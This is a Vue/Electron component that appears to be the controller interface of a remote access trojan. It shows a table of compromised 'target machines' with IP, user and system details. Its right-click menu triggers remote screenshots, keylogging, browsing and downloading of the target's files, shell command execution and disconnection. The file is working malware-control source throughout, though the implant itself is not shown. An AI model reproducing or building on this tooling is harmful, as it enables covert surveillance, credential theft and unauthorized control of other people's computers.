<template>
  <div
      @dblclick="refreshList"
  >
    <el-table
        :data="$store.state.targetList"
        border
        stripe
        height="250"
        style="width: 100%"
        :row-class-name="tableRowClassName"
        @row-contextmenu="rightClick"
        empty-text="双击刷新列表"
    >
      <el-scrollbar style="height:100%">
        <el-table-column
            prop="ip"
            label="IP">
        </el-table-column>
        <el-table-column
            prop="user"
            label="User"
            width="160">
        </el-table-column>
        <el-table-column
            prop="port"
            label="Port"
            width="160">
        </el-table-column>
        <el-table-column
            prop="system"
            label="System"
            width="160">
        </el-table-column>
        <el-table-column
            prop="uuid"
            label="uuid"
            width="160">
        </el-table-column>
      </el-scrollbar>
    </el-table>
    <div id="targetMenu">
      <div class="menu"
        v-for="(item,index) in menus"
        :key="index"
        @click.stop="infoClick(index)">{{ item }}</div>
    </div>
  </div>
</template>

<script>
import { ipcRenderer } from 'electron'

export default {
  data () {
    return {
      menus: ['刷新列表', '屏幕截图', '键盘记录', '文件目录', '断开连接'],
      currentRowIndex: 0
    }
  },
  methods: {
    tableRowClassName ({row, rowIndex}) {
      row.index = rowIndex
    },
    // 自定义菜单点击事件
    infoClick (index) {
      if (this.menus[index] === '刷新列表') {
        this.updateTargetList(this.currentRowIndex)
        this.$forceUpdate()
      }
      if (this.menus[index] === '屏幕截图') {
        this.getScreenShot()
      }
      if (this.menus[index] === '键盘记录') {
        this.requestKeylogger()
      }
      if (this.menus[index] === '文件目录') {
        this.requestFilePreview()
      }
      if (this.menus[index] === '断开连接') {
        this.disconnectTarget()
      }
    },
    /**
     * @description: 更新当前靶机
     * @param {string} newUuid 当前target索引
     * @return {type} 返回成功改变的uuid
     */
    changeCurrentTarget (newUuid) {
      ipcRenderer.once('currentTargetChanged', (event, packet) => {
        console.log(`new target uuid ${packet}`)
      })
      ipcRenderer.send('setCurrentTarget', newUuid)
    },
    /**
     * @description: 更新靶机列表
     * @return {json}  targetList 靶机列表
     */
    updateTargetList (index) {
      ipcRenderer.once('updateTargetList', (event, targetList) => {
        this.$store.commit('updateTargetList', targetList)
        this.changeCurrentTarget(targetList[index].uuid)
        this.$store.commit('changeCurrentUUID', targetList[index].uuid)
        this.$alert('成功刷新列表', {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
      })
      ipcRenderer.send('requestTargetList')
    },
    /**
     * @description: 请求shell
     * @return {boolean} status shell连接状态
     */
    requestShell () {
      ipcRenderer.once('getShell', (event, status) => {
        alert('Vue:' + status)
      })
      ipcRenderer.send('requestShell', 'start')
    },
    /**
     * @description: 请求断开shell
     * @return {boolean} status shell连接状态
     */
    stopShell () {
      ipcRenderer.once('stopShell', (event, status) => {
        alert('Vue:' + status)
      })
      ipcRenderer.send('requestShell', 'stop')
    },
    /**
     * @description: 请求键盘监控开始
     * @return {string} stream
     */
    requestKeylogger () {
      ipcRenderer.once('keyloggerStart', (event, stream) => {
        this.$alert('开始键盘记录', {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
      })
      ipcRenderer.send('requestKeylogger', 'start')
    },
    /**
     * @description: 请求键盘更新
     * @return {string} stream 新增的键盘输入
     */
    updateKeylogger () {
      ipcRenderer.once('KeyloggerUpdate', (event, stream) => {
        alert('Vue:' + stream)
      })
      ipcRenderer.send('requestKeylogger', 'update')
    },
    /**
     * @description: 断开键盘更新
     * @return {string} res 断开键盘监控提示
     */
    stopKeylogger () {
      ipcRenderer.once('keyloggerStop', (event, res) => {
        alert('Vue:' + res)
      })
      ipcRenderer.send('requestKeylogger', 'stop')
    },
    /**
     * @description: 断开靶机连接
     * @return {string} status 靶机断开回复
     */
    disconnectTarget () {
      ipcRenderer.once('disconnected', (event, status) => {
        this.$alert('已断开连接', {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
      })
      ipcRenderer.send('disconnect')
    },
    /**
     * @description: 获取屏幕截图
     * @return {string} url 屏幕截图保存路径
     */
    getScreenShot () {
      ipcRenderer.once('ScreenShot', (event, url) => {
        let screenshotName = url.split('\\')[url.split('\\').length - 1]
        let date = new Date()
        let newdate = date.toLocaleString('chinese', { hour12: false })
        let set = {
          name: screenshotName,
          time: newdate
        }
        console.log(set)
        this.$store.commit('appendScreenshotList', set)
        console.log(this.$store.state.screenshotList, 1213)
        this.$alert('文件保存在：' + url, {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
      })
      ipcRenderer.send('requestScreenShot')
    },
    /**
     * @description: 获取文件
     * @return {string} url 文件保存路径
     */
    getFile (p, f) {
      ipcRenderer.once('transfile', (event, url) => {
        alert('文件保存在' + url)
      })
      ipcRenderer.send('requestFile', { path: p, fileName: f })
    },
    /**
     * @description: 求取文件预览目录
     * @param {string} rootPath 请求浏览的目录默认为C:\\
     * @return {undefined} filePreview 文件预览目录
     */
    requestFilePreview (rootPath = 'C:\\') {
      ipcRenderer.once('filepreview', (event, filePreview) => {
        this.$alert('成功获取文件目录', {
          confirmButtonText: '确定',
          callback: action => {
            let targetMenu = document.querySelector('#targetMenu')
            targetMenu.style.display = 'none'
          }
        })
        let tmp = JSON.parse(filePreview)
        let filePath = tmp['position'].split('\\')
        console.log(filePath)
        this.$store.commit('updateCurrentPath', filePath)
        let fileList = tmp['fileInfo']
        console.log(fileList)
        this.$store.commit('updateCurrentFileList', fileList)
      })
      ipcRenderer.send('requestFilePreview', rootPath)
    },
    /**
     * @description: 发送shell指令
     * @param {string} commandLines 命令行
     * @return {string} shell指令回复
     */
    sendCommand (commandLines) {
      ipcRenderer.once('commandSended', (event, res) => {
        alert('Vue:' + res)
      })
      ipcRenderer.send('sendCommand', commandLines)
    },
    // table的右键点击当前行事件
    rightClick (row, column, event) {
      let targetMenu = document.querySelector('#targetMenu')
      event.preventDefault()
      targetMenu.style.left = (event.clientX - 200) + 'px'
      targetMenu.style.top = (event.clientY - 60) + 'px'
      targetMenu.style.display = 'block'
      console.log(row, column)
      this.currentRowIndex = row.index
    },
    refreshList () {
      this.updateTargetList(0)
      this.$forceUpdate()
    }
  }
}
</script>

<style>
.el-table__body-wrapper::-webkit-scrollbar {
  /*width: 0;宽度为0隐藏*/
  width: 0;
}

.el-table__body-wrapper::-webkit-scrollbar-thumb {
  border-radius: 2px;
  height: 50px;
  background: #eee;
}

.el-table__body-wrapper::-webkit-scrollbar-track {
  overflow-x: hidden;
  overflow-y: hidden;
  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);
  border-radius: 2px;
  background: rgba(0, 0, 0, 0.4);
}

#targetMenu {
  font-size: 12px;
  width: 100px;
  height: 125px;
  overflow: hidden; /*隐藏溢出的元素*/
  box-shadow: 0 1px 1px #888, 1px 0 1px #ccc;
  position: absolute;
  display: none;
  background: #ffffff;
  z-index: 10;
}

.menu {
  width: 125px;
  height: 25px;
  line-height: 25px;
  text-indent: 10px;
  cursor: pointer;
}

.menu:hover {
  color: deeppink;
  text-decoration: underline;
}
</style>
